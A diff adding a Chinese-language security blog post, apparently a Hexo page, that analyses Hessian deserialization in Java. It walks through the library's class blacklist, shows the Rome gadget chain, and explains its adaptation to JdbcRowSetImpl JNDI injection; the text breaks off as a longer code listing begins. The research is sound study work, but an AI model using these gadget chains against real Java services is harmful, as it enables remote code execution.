@@ -1,0 +1,695 @@
+<!DOCTYPE html>
+<html lang="en" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="keywords" content="" />
+  <meta name="author" content="ki10Moc" />
+  <meta name="description" content="" />
+  
+  
+  <title>
+    
+      Hessian反序列化 
+      
+      
+      |
+    
+     ki10Moc&#39;s World
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/1.png">
+    <link rel="icon" href="/images/1.png">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  
+<link rel="stylesheet" href="/css/color-scheme.css">
+<link rel="stylesheet" href="/css/base.css">
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css">
+<link rel="stylesheet" href="/css/github-markdown.css">
+<link rel="stylesheet" href="/css/highlight.css">
+<link rel="stylesheet" href="/css/comments.css">
+
+  <!-- 代码块风格 -->
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-RG82N8DQZ9"></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+
+      gtag('config', 'G-RG82N8DQZ9');
+    </script>
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 6.2.0"><link rel="alternate" href="/atom.xml" title="ki10Moc's World" type="application/atom+xml">
+</head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/1.png" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">ki10Moc</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">主页</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">标签</a>
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          <a href="/friends/">友链</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">ki10Moc</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">Hessian反序列化</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime" title="Update time"></i>
+          2023-06-05 17:36:36
+        </span>
+        
+              <span class="post-tags">
+                <i class="iconfont icon-tags" title="Tags"></i>
+                
+                <span class="span--tag">
+                  <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" title="代码审计">
+                    <b>#</b> 代码审计
+                  </a>
+                </span>
+                
+                <span class="span--tag">
+                  <a href="/tags/Java%E5%AE%89%E5%85%A8/" title="Java安全">
+                    <b>#</b> Java安全
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <p>[TOC]</p>
+<h1 id="0x01-hessian简介"><a class="markdownIt-Anchor" href="#0x01-hessian简介">#</a> 0x01 Hessian 简介</h1>
+<blockquote>
+<p>Hessian 是二进制的 web service 协议，官方对 Java、Flash/Flex、Python、C++、.NET C# 等多种语言都进行了实现。Hessian 和 Axis、XFire 都能实现 web service 方式的远程方法调用，区别是 Hessian 是二进制协议，Axis、XFire 则是 SOAP 协议，所以从性能上说 Hessian 远优于后两者，并且 Hessian 的 JAVA 使用方法非常简单。它使用 Java 语言接口定义了远程对象，集合了序列化 / 反序列化和 RMI 功能。</p>
+</blockquote>
+<p>Hessian 是基于 Field 机制的反序列化。是直接对 Field 进行复制操作的机制，不是通过 getter、setter 方法对属性赋值。就对象进行的方法调用而言，基于字段的机制通常通常不构成攻击面。</p>
+<h2 id="hessian概念图"><a class="markdownIt-Anchor" href="#hessian概念图">#</a> Hessian 概念图</h2>
+<p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20220407164201828.png" alt="img"></p>
+<ul>
+<li>Serializer：序列化的接口</li>
+<li>Deserializer ：反序列化的接口</li>
+<li>AbstractHessianInput ：hessian 自定义的输入流，提供对应的 read 各种类型的方法</li>
+<li>AbstractHessianOutput ：hessian 自定义的输出流，提供对应的 write 各种类型的方法</li>
+<li>AbstractSerializerFactory：抽象序列化工厂类</li>
+<li>SerializerFactory ：Hessian 序列化工厂的标准实现</li>
+<li>ExtSerializerFactory：可以设置自定义的序列化机制，通过该 Factory 可以进行扩展</li>
+<li>BeanSerializerFactory：对 SerializerFactory 的默认 object 的序列化机制进行强制指定，指定为使用 BeanSerializer 对 object 进行处理</li>
+</ul>
+<p>Hessian Serializer/Derializer 默认情况下实现了以下序列化 / 反序列化器，用户也可通过接口 / 抽象类自定义序列化 / 反序列化器：</p>
+<p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20230717090136667.png" alt="image-20230717090136667"></p>
+<p>序列化时会根据对象、属性不同类型选择对应的序列化其进行序列化；反序列化时也会根据对象、属性不同类型选择不同的反序列化器；每个类型序列化器中还有具体的 FieldSerializer。这里注意下 JavaSerializer/JavaDeserializer 与 BeanSerializer/BeanDeserializer，它们不是类型序列化 / 反序列化器，而是属于机制序列化 / 反序列化器：</p>
+<ol>
+<li>JavaSerializer：通过反射获取所有 bean 的属性进行序列化，排除 static 和 transient 属性，对其他所有的属性进行递归序列化处理 (比如属性本身是个对象)</li>
+<li>BeanSerializer 是遵循 pojo bean 的约定，扫描 bean 的所有方法，发现存在 get 和 set 方法的属性进行序列化，它并不直接直接操作所有的属性，比较温柔</li>
+</ol>
+<h2 id="总结扩展"><a class="markdownIt-Anchor" href="#总结扩展">#</a> 总结 &amp; 扩展</h2>
+<p>1、Hessian 是二进制的 web service 协议，用于在分布式系统中进行远程过程调用（RPC）和序列化。</p>
+<p>(这里提一句，看到远程调用可能会想到 RMI，其实这俩都是为了远程调用程序设计的，其中 RMI 是专门针对 java 语言的。而 RPC 是一种通用的概念，可应用于不同的编程语言之间的通信。两者都需要定义接口或者方法来描述可远程调用的操作。)</p>
+<p>2、Hessian 因为是二进制协议，所以传输速率上要优于其他协议。但其相交于 json 格式其字节数会更多。并且不易读 (毕竟二进制)。<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1UB4y137jJ/?buvid=Y647AB69408AEF52431692A0EF75047505E2&amp;is_story_h5=false&amp;mid=wO%2FoaR2s9SMdAN2y%2F%2B5F8w%3D%3D&amp;p=1&amp;plat_id=114&amp;share_from=ugc&amp;share_medium=iphone&amp;share_plat=ios&amp;share_session_id=CB74407B-7EEC-44A5-8580-95BCC15ED808&amp;share_source=QQ&amp;share_tag=s_i&amp;timestamp=1689490462&amp;unique_k=Z6TubJM&amp;up_id=114211556&amp;vd_source=06af58cf43c55373ff2006011cb9adde">hessian 序列化 - demo 演示_哔哩哔哩_bilibili</a></p>
+<p>3、Hessian 的反序列化是基于 Field 机制的。许多集合、Map 等类型无法使用它们运行时表示形式进行传输 / 存储，这意味着所有基于字段的编组器都会为某些类型捆绑定制转换器。这些转换器或其各自的目标类型通常必须调用攻击者提供的对象上的方法，例如 Hessian 中如果是反序列化 map 类型，会调用 MapDeserializer 处理 map，期间 map 的 put 方法被调用，map 的 put 方法又会计算被恢复对象的 hash 造成 hashcode 调用（这里对 hashcode 方法的调用就是前面说的必须调用攻击者提供的对象上的方法），根据实际情况，可能 hashcode 方法中还会触发后续的其他方法调用。</p>
+<h2 id="测试"><a class="markdownIt-Anchor" href="#测试">#</a> 测试</h2>
+<p>下面我们来看下原生的反序列化</p>
+<p>一个 test 类</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String name=<span class="string">&quot;ki10Moc&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age=<span class="number">222</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream ois)</span>&#123;</span><br><span class="line">        System.out.print(<span class="string">&quot;自动调用了readObject方法&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>一个 demo 启动类</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">demo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">ser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(ser);</span><br><span class="line">        oser.writeObject(<span class="keyword">new</span> <span class="title class_">test</span>());</span><br><span class="line">        oser.close();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        System.out.println(ser);</span><br><span class="line">        ObjectInputStream unser=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(ser.toByteArray()));</span><br><span class="line">        Object newobj=unser.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20230717091105399.png" alt="image-20230717091105399"></p>
+<p>再来看一个 Hessian 的反序列化</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.HessianInput;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.HessianOutput;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HessianDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">ser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        HessianOutput hessianOutput=<span class="keyword">new</span> <span class="title class_">HessianOutput</span>(ser);</span><br><span class="line">        hessianOutput.writeObject(<span class="keyword">new</span> <span class="title class_">test</span>());</span><br><span class="line">        hessianOutput.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(ser);</span><br><span class="line"></span><br><span class="line">        HessianInput hessianInput=<span class="keyword">new</span> <span class="title class_">HessianInput</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(ser.toByteArray()));</span><br><span class="line">        hessianInput.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20230717091132040.png" alt="image-20230717091132040"></p>
+<p>可以发现其并不会像原生的 Gadget 自动调用 readObject 方法</p>
+<p>并且 Hessian 反序列化中的类是不需要实现序列化接口的</p>
+<p>下面我们 debug 看下</p>
+<h1 id="0x02-调试分析"><a class="markdownIt-Anchor" href="#0x02-调试分析">#</a> 0x02 调试分析</h1>
+<h2 id="无用的流程"><a class="markdownIt-Anchor" href="#无用的流程">#</a> 无用的流程</h2>
+<p>这段 debug 可能也没什么意义吧。。似乎</p>
+<p>只是走了一遍流程，嫌麻烦的话完全可以去掉这一过程</p>
+<p>进入 HessianInput 的 readObject 方法</p>
+<p>首先判断第一个 tag 为 77 (M)</p>
+<p>因为 Hessian 序列化时将结果处理成了 Map</p>
+<p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20230717091310090.png" alt="image-20230717091310090"></p>
+<p>然后是遍历反序列化对象的名称字段和 ascill</p>
+<p>我这里就是 org.example.test</p>
+<p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20230717091352063.png" alt="image-20230717091352063"></p>
+<p>到这里开始就进入到了序列化工厂类</p>
+<p>先是调用 readMap</p>
+<p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20230717091417005.png" alt="image-20230717091417005"></p>
+<p>这里就是看哪种能获取哪种 type，然后调用对应的反序列化器</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">readMap</span><span class="params">(AbstractHessianInput in, String type)</span></span><br><span class="line">    <span class="keyword">throws</span> HessianProtocolException, IOException</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">Deserializer</span> <span class="variable">deserializer</span> <span class="operator">=</span> getDeserializer(type);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (deserializer != <span class="literal">null</span>)</span><br><span class="line">      <span class="keyword">return</span> deserializer.readMap(in);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (_hashMapDeserializer != <span class="literal">null</span>)</span><br><span class="line">      <span class="keyword">return</span> _hashMapDeserializer.readMap(in);</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      _hashMapDeserializer = <span class="keyword">new</span> <span class="title class_">MapDeserializer</span>(HashMap.class);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> _hashMapDeserializer.readMap(in);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+<p>第一步先进入 <code>getDeserializer</code></p>
+<p>先判断类型，不能为空</p>
+<p>进入下一个 if</p>
+<p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20230717091500699.png" alt="image-20230717091500699"></p>
+<p>其中 <code>_cachedSerializerMap</code>  是一个私有的 HashMap 类型</p>
+<p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20230717091650023.png" alt="image-20230717091650023"></p>
+<p>然后这里获取到 type，并强转为 Deserializer</p>
+<p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20230717091702256.png" alt="image-20230717091702256"></p>
+<p>但这里 deserializer 的值仍为 null</p>
+<p>说明其 type 没有对应上</p>
+<p>最后一个判断，是否是 [(数组) 开头，显然也不是</p>
+<p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20230717091714769.png" alt="image-20230717091714769"></p>
+<p>进入 try 的 loadSerializedClass 方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Class&lt;?&gt; loadSerializedClass(String className)</span><br><span class="line">    <span class="keyword">throws</span> ClassNotFoundException</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">return</span> getClassFactory().load(className);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+<p>该方法直接调用了 getClassFactory ().load 处理结果并返回</p>
+<p>继续跟进</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Class&lt;?&gt; load(String className)</span><br><span class="line">    <span class="keyword">throws</span> ClassNotFoundException</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> (isAllow(className)) &#123;</span><br><span class="line">      <span class="keyword">return</span> Class.forName(className, <span class="literal">false</span>, _loader);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> HashMap.class;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20230717091811304.png" alt="image-20230717091811304"></p>
+<p>这里就将 org.example.test 初始化</p>
+<p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20230717092945067.png" alt="image-20230717092945067"></p>
+<p>接下来就是判断</p>
+<p>我们直接看下代码，也是比较好理解的</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Allow</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Boolean _isAllow;</span><br><span class="line">    <span class="keyword">private</span> Pattern _pattern;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">Allow</span><span class="params">(String pattern, <span class="type">boolean</span> isAllow)</span></span><br><span class="line">    &#123;</span><br><span class="line">      _isAllow = isAllow;</span><br><span class="line">      _pattern = Pattern.compile(pattern);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    Boolean <span class="title function_">allow</span><span class="params">(String className)</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (_pattern.matcher(className).matches()) &#123;</span><br><span class="line">        <span class="keyword">return</span> _isAllow;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">static</span> &#123;</span><br><span class="line">    ArrayList&lt;Allow&gt; blacklist = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Allow&gt;();</span><br><span class="line">    </span><br><span class="line">    blacklist.add(<span class="keyword">new</span> <span class="title class_">Allow</span>(<span class="string">&quot;java\\.lang\\.Runtime&quot;</span>, <span class="literal">false</span>));</span><br><span class="line">    blacklist.add(<span class="keyword">new</span> <span class="title class_">Allow</span>(<span class="string">&quot;java\\.lang\\.Process&quot;</span>, <span class="literal">false</span>));</span><br><span class="line">    blacklist.add(<span class="keyword">new</span> <span class="title class_">Allow</span>(<span class="string">&quot;java\\.lang\\.System&quot;</span>, <span class="literal">false</span>));</span><br><span class="line">    blacklist.add(<span class="keyword">new</span> <span class="title class_">Allow</span>(<span class="string">&quot;java\\.lang\\.Thread&quot;</span>, <span class="literal">false</span>));</span><br><span class="line">    </span><br><span class="line">    _staticAllowList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Allow&gt;(blacklist);</span><br><span class="line">    </span><br><span class="line">    _staticAllowList.add(<span class="keyword">new</span> <span class="title class_">Allow</span>(<span class="string">&quot;java\\..+&quot;</span>, <span class="literal">true</span>));</span><br><span class="line">    _staticAllowList.add(<span class="keyword">new</span> <span class="title class_">Allow</span>(<span class="string">&quot;javax\\.management\\..+&quot;</span>, <span class="literal">true</span>));</span><br><span class="line">    </span><br><span class="line">    _staticDenyList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Allow&gt;(blacklist);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+<p>一个静态方法 Allow</p>
+<p>用来控制该类是否为可访问项</p>
+<p>一个匹配模式和 Bool 型返回值</p>
+<p>其中黑名单，0123 分别对应了四种类</p>
+<p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20230717095930595.png" alt="image-20230717095930595"></p>
+<p>下面那两个就是允许访问的类</p>
+<p>然后遍历四个黑名单均为 false</p>
+<p>遍历完返回 null</p>
+<p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20230717100438918.png" alt="image-20230717100438918"></p>
+<p>接着就到了 loadDeserializer</p>
+<p>但是上面的类名均不在名单中所以返回都是 null</p>
+<p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20230717101449995.png" alt="image-20230717101449995"></p>
+<p>该过程中加载了很多个不同的 Deserializer 对应的方法，均 null</p>
+<p>最终在 else 处加载到内容</p>
+<p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20230717102842527.png" alt="image-20230717102842527"></p>
+<p>接着回到 <code>SerializerFactory.getDeserializer</code></p>
+<p>在 <code>loadDeserializer</code></p>
+<p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20230717103231272.png" alt="image-20230717103231272"></p>
+<p>并比对是否在缓存中的该类型反序列化器</p>
+<p>因为加载到了相应的反序列化器，所以就一马平川到了这里</p>
+<p>直接返回了 readMap 的 in，回到开始的 HessianInput 处理流</p>
+<p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20230717103406461.png" alt="image-20230717103406461"></p>
+<p>也是直接返回内容</p>
+<p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20230717103440105.png" alt="image-20230717103440105"></p>
+<p>最终走完整个过程</p>
+<p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20230717103456577.png" alt="image-20230717103456577"></p>
+<h2 id="漏洞分析"><a class="markdownIt-Anchor" href="#漏洞分析">#</a> 漏洞分析</h2>
+<p>刚才我们分析序列化工厂这里的 <code>getDeserializer</code></p>
+<p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20230717110933721.png" alt="image-20230717110933721"></p>
+<p>代码会将其存储到 <code>_cachedTypeDeserializerMap</code>  中，以便下次相同 <code>type</code>  的请求可以从缓存中直接获取。</p>
+<p>再联想到可以调用任意类的 hashCode ()</p>
+<p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20230717111148926.png" alt="image-20230717111148926"></p>
+<p>所以接下来就需要 hashCode () 作为反序列化入口即可</p>
+<h3 id="rome链"><a class="markdownIt-Anchor" href="#rome链">#</a> Rome 链</h3>
+<p>Rome 链，从 TemplatesImpl 的 getter 方法 -&gt;JdbcRowSetImpl 的 getter 方法实现 JNDI 注入</p>
+<p>Gadget</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">* TemplatesImpl.getOutputProperties()</span><br><span class="line">* ToStringBean.toString(String)</span><br><span class="line">* ToStringBean.toString()</span><br><span class="line">* ObjectBean.toString()</span><br><span class="line">* EqualsBean.beanHashCode()</span><br><span class="line">* ObjectBean.hashCode()</span><br><span class="line">* HashMap&lt;K,V&gt;.hash(Object)</span><br><span class="line">* HashMap&lt;K,V&gt;.readObject(ObjectInputStream)</span><br></pre></td></tr></table></figure>
+<p>这是 Rome 链的流程但是在 Hessian 不能使用</p>
+<p>之所以不能用 <code>TemplatesImpl</code>  的这个链子，就是因为 <code>_tfactory</code>  属性是 <code>transient</code>  的，Hessian 的反序列化不像正常的反序列化那样可以调用 readObject，_tfactory 无法处理，为 null 的情况下就不能实现动态加载字节码，所以换成了 <code>JdbcRowSetImpl</code>  的 <code>getter</code>  来实现 JNDI 注入</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span 